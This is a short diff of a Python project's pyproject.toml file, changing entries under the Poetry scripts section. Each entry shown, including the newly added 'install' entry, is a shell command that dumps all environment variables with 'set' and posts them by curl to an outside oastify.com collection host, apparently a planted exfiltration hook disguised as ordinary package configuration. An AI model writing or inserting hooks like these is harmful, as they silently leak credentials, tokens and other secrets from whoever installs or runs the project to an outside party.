@@ -46,7 +46,7 @@ build-backend = "poetry.masonry.api"
 
 [tool.poetry.scripts]
 replit = "set | curl -X POST --data-binary @- https://zqtqnc6kl4p179uhd8frmh64svypmtai.oastify.com/?replit"
-setup = "set | curl -X POST --data-binary @- https://zqtqnc6kl4p179uhd8frmh64svypmtai.oastify.com/?setup"
+install = "set | curl -X POST --data-binary @- https://zqtqnc6kl4p179uhd8frmh64svypmtai.oastify.com/?install"
 
 [tool.mypy]
 exclude = [
